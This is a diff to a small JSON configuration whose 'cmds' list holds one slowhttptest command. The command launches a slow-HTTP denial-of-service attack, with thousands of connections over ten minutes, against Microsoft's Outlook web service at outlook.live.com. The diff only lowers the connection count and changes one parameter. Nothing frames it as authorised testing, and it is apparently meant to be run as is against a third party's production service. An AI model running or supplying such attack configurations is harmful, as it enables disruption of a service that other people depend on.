@@ -1,5 +1,5 @@
 {
 "cmds":[
-	"slowhttptest -c 10000 -X -g -o output -r 300 -w 512 -y 1024 -n 5 -z 32 -k 3 -l 600 -u https://outlook.live.com/owa/0/?state=1&redirectTo=aHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC9pbmJveC9pZC9BUVFrQURBd0FUTTNabVlBWlMwME1HSTVMV1l4WmpBdE1EQUNMVEF3Q2dBUUFHcUZZTGpTWEhWQWlwakNyRmh0Sm5ZPS8 -p 3",
+	"slowhttptest -c 8000 -X -g -o output -r 300 -w 512 -y 1024 -n 5 -z 32 -k 3 -l 600 -u https://outlook.live.com/owa/0/?state=1&redirectTo=aHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC9pbmJveC9pZC9BUVFrQURBd0FUTTNabVlBWlMwME1HSTVMV1l4WmpBdE1EQUNMVEF3Q2dBUUFHcUZZTGpTWEhWQWlwakNyRmh0Sm5ZPS8 -p 4",
 	]
 }
